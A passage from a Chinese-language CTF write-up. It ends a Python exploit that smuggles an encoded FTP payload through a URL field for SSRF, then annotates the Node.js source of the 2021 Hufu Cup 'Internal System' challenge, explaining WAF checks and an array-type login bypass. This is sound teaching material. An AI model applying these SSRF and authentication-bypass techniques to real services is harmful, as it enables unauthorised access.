    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    ftp_payload = payload_encode(ftp_payload)
    print(ftp_payload)
    json_data2 = {
        "url":"http://ftp:8899/"+ftp_payload    # 通过这里的url值进行SSRF
    }
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
成功得到flag：
## [2021 虎符杯 CTF]Internal System
进入题目，是一个很炫酷的登录页面：
访问 /source 路由得到源码：
    const express = require('express')
    const router = express.Router()
    const axios = require('axios')
    const isIp = require('is-ip')
    const IP = require('ip')
    const UrlParse = require('url-parse')
    const {sha256, hint} = require('./utils')
    const salt = 'nooooooooodejssssssssss8_issssss_beeeeest'
    const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin'))    // 计算 admin 的哈希
    const port = process.env.PORT || 3000    // 这个 NodeJS 服务默认是开在 3000 端口
    function formatResopnse(response) {
      if(typeof(response) !== typeof('')) {
        return JSON.stringify(response)    // 如果 response 不等于空, 则将其转换为 JSON 的格式并返回
      } else {
        return response
      }
    }
    function SSRF_WAF(url) {
      const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')    // 将 hostname 中的 [ ] 替换为空
      return isIp(host) && IP.isPublic(host)    // hostname必须是ip, 并且如果是公网IP则返回true, 防止 SSRF
    }
    function FLAG_WAF(url) {
      const pathname = new UrlParse(url).pathname    // pathname 中不能有/flag
      return !pathname.startsWith('/flag')
    }
    function OTHER_WAF(url) {
      return true;
    }
    const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]
    router.get('/', (req, res, next) => {
      if(req.session.admin === undefined || req.session.admin === null) {    // 如果没设置 session.admin 则返回登录页面
        res.redirect('/login')
      } else {
        res.redirect('/index')
      }
    })
    router.get('/login', (req, res, next) => {
      const {username, password} = req.query;
      if(!username || !password || username === password || username.length === password.length || username === 'admin') {
        res.render('login')    // 主要判断是否输入，以及所输入的用户名和密码是否一致，以及用户名是否为 admin，如果是的话，直接拦截
      } else {    // 可以设 username=['admin']&password=admin 绕过
        const hash = sha256(sha256(salt + username) + sha256(salt + password))
        req.session.admin = hash === adminHash    // session.admin 等于 "hash === adminHash" 的判断结果
        res.redirect('/index')    // 重定向到 /index 路由
      }
    })
    router.get('/index', (req, res, next) => {
      if(req.session.admin === undefined || req.session.admin === null) {
        res.redirect('/login')
      } else {
        res.render('index', {admin: req.session.admin, network: JSON.stringify(require('os').networkInterfaces())})
      }
    })
    router.get('/proxy', async(req, res, next) => {
      if(!req.session.admin) {    // 必须用admin访问
        return res.redirect('/index')
      }
      const url = decodeURI(req.query.url);    // 进行一次 URL 解码
      console.log(url)
      const status = WAF_LISTS.map((waf)=>waf(url)).reduce((a,b)=>a&&b)
      if(!status) {    // status 必须为 true
        res.render('base', {title: 'WAF', content: "Here is the waf..."})
      } else {
        try {
          const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`)
          res.render('base', response.data)
        } catch(error) {
          res.render('base', error.message)
        }
      }
    })
    router.post('/proxy', async(req, res, next) => {
      if(!req.session.admin) {    // // 必须用admin访问
        return res.redirect('/index')
      }
      // test url
      // not implemented here
      const url = "https://postman-echo.com/post"
      await axios.post(`http://127.0.0.1:${port}/search?url=${url}`)
      res.render('base', "Something needs to be implemented")
    })
    router.all('/search', async (req, res, next) => {
      if(!/127\.0\.0\.1/.test(req.ip)){    // 必须要匹配到 127.0.0.1, 即必须在本地访问 /search 这个路由
        return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
      }
      const result = {title: 'Search Success', content: ''}
      const method = req.method.toLowerCase()    // 请求方式
      const url = decodeURI(req.query.url)    // 再进行二次 URL 解码
      const data = req.body
      try {
        if(method == 'get') {
          const response = await axios.get(url)
          result.content = formatResopnse(response.data)
        } else if(method == 'post') {
          const response = await axios.post(url, data)
          result.content = formatResopnse(response.data)
        } else {
          result.title = 'Error'
          result.content = 'Unsupported Method'
        }
      } catch(error) {
        result.title = 'Error'
        result.content = error.message
      }
      return res.json(result)
    })
    router.get('/source', (req, res, next)=>{
      res.sendFile( __dirname + "/" + "index.js");
    })
    router.get('/flag', (req, res, next) => {
      if(!/127\.0\.0\.1/.test(req.ip)){    // 必须要匹配到 127.0.0.1, 即必须在本地访问 /flag 这个路由
        return res.send({title: 'Error', content: 'No Flag For You!'})
      }
      return res.json({hint: hint})
    })
    module.exports = router
代码逻辑比较简单，不做过多描述。
首先我们要做的是登录，登录的处理逻辑：
    router.get('/login', (req, res, next) => {
      const {username, password} = req.query;
      if(!username || !password || username === password || username.length === password.length || username === 'admin') { // 主要判断是否输入，以及所输入的用户名和密码是否一致，以及用户名是否为 admin，如果是的话，直接拦截
        res.render('login')
      } else {
        const hash = sha256(sha256(salt + username) + sha256(salt + password)) // 组合成 hash
        req.session.admin = hash === adminHash // 与管理员 hash 比较，对上了就给 session 里这个东西赋值真
        res.redirect('/index')
      }
    })
这里用到了 JavaScript 弱类型的特性。即 JavaScript 的数组在使用加号拼接的时候最终还是会得到一个字符串（string），于是不会影响